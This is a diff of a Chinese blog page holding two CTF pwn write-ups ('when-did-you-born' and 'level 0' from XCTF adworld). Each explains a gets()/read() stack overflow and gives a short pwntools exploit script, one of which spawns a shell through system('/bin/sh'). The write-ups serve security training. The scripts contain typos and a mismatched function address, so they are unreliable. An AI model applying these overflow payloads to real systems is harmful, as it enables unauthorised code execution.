-                <time title="Modified: 2020-09-03 12:37:23" itemprop="dateModified" datetime="2020-09-03T12:37:23+08:00">2020-09-03</time>
+                <time title="Modified: 2020-10-12 20:04:30" itemprop="dateModified" datetime="2020-10-12T20:04:30+08:00">2020-10-12</time>
               </span>
 
           
@@ -744,21 +780,21 @@
 
       
           <p>攻防世界pwn题 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5051&page=1" target="_blank" rel="noopener">新手练习区when-did-you-born</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./when-born/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/when-born/1.png" alt="Alt text" title="Optional title"></p>
 <p>下载完成后，用ida pro打开</p>
-<p><img src="./when-born/2.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-找到main函数后，按F5转换成伪代码"><a href="#2-找到main函数后，按F5转换成伪代码" class="headerlink" title="2.找到main函数后，按F5转换成伪代码"></a>2.找到main函数后，按F5转换成伪代码</h3><p><img src="./when-born/3.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/when-born/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-找到main函数后，按F5转换成伪代码"><a href="#2-找到main函数后，按F5转换成伪代码" class="headerlink" title="2.找到main函数后，按F5转换成伪代码"></a>2.找到main函数后，按F5转换成伪代码</h3><p><img src="/images/when-born/3.png" alt="Alt text" title="Optional title"></p>
 <h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p>发现一个特别的代码<br><strong><em>system(“cat flag”)</em></strong><br>暗示我们此处可以可到flag。再看看获取条件，可以得知，在<br><strong>v5==1926</strong><br>的条件下我们可以执行这行代码。然而，在之前有个判断，使v5不能等于1926，否则直接退出了。<br>但是，我们发现gets()函数并没有对输入进行检查。因此，我们可以考虑栈溢出，让输入覆盖到v5的部分，使v5的内容转变为1926</p>
-<p><img src="./when-born/4.png" alt="Alt text" title="Optional title"></p>
-<p><img src="./when-born/5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/when-born/4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/when-born/5.png" alt="Alt text" title="Optional title"></p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">form pwn import *</span><br><span class="line">p &#x3D; remote(&quot;ip&#x2F;url&quot;,port)</span><br><span class="line">p.sendafter(&quot;Your Birth?&#x2F;n&quot;,str(111)+&#39;\n&#39;)</span><br><span class="line">p.sendafter(&quot;Your Name?&#x2F;n&quot;,&#39;a&#39;*8+p64(1926))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
-<p><img src="./when-born/6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/when-born/6.png" alt="Alt text" title="Optional title"></p>
 <p>编写payload</p>
-<p><img src="./when-born/7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/when-born/7.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本,得到flag</p>
-<p><img src="./when-born/8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/when-born/8.png" alt="Alt text" title="Optional title"></p>
 
       
     </div>
@@ -809,7 +845,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-02 16:12:06" itemprop="dateModified" datetime="2020-09-02T16:12:06+08:00">2020-09-02</time>
+                <time title="Modified: 2020-10-12 20:04:43" itemprop="dateModified" datetime="2020-10-12T20:04:43+08:00">2020-10-12</time>
               </span>
 
           
@@ -824,29 +860,29 @@
 
       
           <p>攻防世界pwn题目<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053&page=1" target="_blank" rel="noopener">新手练习区level 0</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./adworld-level_0-image/4.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/adworld-level_0-image/4.png" alt="Alt text" title="Optional title"></p>
 <p>下载完成后使用ida pro打开</p>
-<p><img src="./adworld-level_0-image/1.png" alt="" title="Optional title"></p>
-<h3 id="2-先找到main-函数点击进入后，按F5使汇编语言转换成伪代码。"><a href="#2-先找到main-函数点击进入后，按F5使汇编语言转换成伪代码。" class="headerlink" title="2.先找到main()函数点击进入后，按F5使汇编语言转换成伪代码。"></a>2.先找到main()函数点击进入后，按F5使汇编语言转换成伪代码。</h3><p><img src="./adworld-level_0-image/2.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-分析这个程序"><a href="#3-分析这个程序" class="headerlink" title="3.分析这个程序"></a>3.分析这个程序</h3><p><img src="./adworld-level_0-image/3.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-level_0-image/1.png" alt="" title="Optional title"></p>
+<h3 id="2-先找到main-函数点击进入后，按F5使汇编语言转换成伪代码。"><a href="#2-先找到main-函数点击进入后，按F5使汇编语言转换成伪代码。" class="headerlink" title="2.先找到main()函数点击进入后，按F5使汇编语言转换成伪代码。"></a>2.先找到main()函数点击进入后，按F5使汇编语言转换成伪代码。</h3><p><img src="/images/adworld-level_0-image/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-分析这个程序"><a href="#3-分析这个程序" class="headerlink" title="3.分析这个程序"></a>3.分析这个程序</h3><p><img src="/images/adworld-level_0-image/3.png" alt="Alt text" title="Optional title"></p>
 <p>在main()函数里调用了一个vulnerable_function()函数，进入这个函数里面查看代码，发现使用了read()函数。</p>
 <p>整个函数的功能是：</p>
 <p>首先，定义一个字符指针buf，长度为 <strong><em>0x80</em></strong>。然后调用了read()函数，在返回read()函数的结果。<br>read()函数的作用是从第一个参数0所代表的文件读取字符，也就是用户输入的东西，读取<br><strong><em>512</em></strong>个长度(第三个参数)，输出到buf所指的内存中。</p>
 <p>然而，read()函数并没有检查输入字符的长度，当我们的输入字符大于buf指针的长度，就可以把后面指令的功能改变。</p>
 <p>查看这个程序，我们发现在callsystem()函数中，有一个<br><strong><em>system(“/bin/sh”)</em></strong>，这个函数可以帮助我们获取到与系统交互的壳，类似于Windows的cmd</p>
-<p><img src="./adworld-level_0-image/5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-level_0-image/5.png" alt="Alt text" title="Optional title"></p>
 <p>于是，我们就有了一个思路了。写入超出buf指针长度的字符，然后在return返回时，返回执行callsystem()这个函数的地址，从而达到运行这个函数，获取到壳。</p>
 <p>callsystem()函数地址为0x400506</p>
-<p><img src="./adworld-level_0-image/6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-level_0-image/6.png" alt="Alt text" title="Optional title"></p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><p>payload文件如下，文件名为adworld-fresh-man_level.py</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(ip,port) **ip为其ip地址，port为端口号**</span><br><span class="line">p.send(&#39;a&#39;*0x88+p64(0x400596))</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
-<p><img src="./adworld-level_0-image/7.png" alt="Alt text" title="Optional title"><br>写payload</p>
-<p><img src="./adworld-level_0-image/8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-level_0-image/7.png" alt="Alt text" title="Optional title"><br>写payload</p>
+<p><img src="/images/adworld-level_0-image/8.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本</p>
-<p><img src="./adworld-level_0-image/9.png" alt="Alt text" title="Optional title"><br>得到shell，使用ls查看文件后，发现flag且可以查看</p>
-<p><img src="./adworld-level_0-image/10.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-level_0-image/9.png" alt="Alt text" title="Optional title"><br>得到shell，使用ls查看文件后，发现flag且可以查看</p>
+<p><img src="/images/adworld-level_0-image/10.png" alt="Alt text" title="Optional title"></p>
 <h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h5><ul>
 <li>C语言中文网-C语言 <a href="http://c.biancheng.net/cpp/html/239.html" target="_blank" rel="noopener">read()函数</a></li>
 </ul>
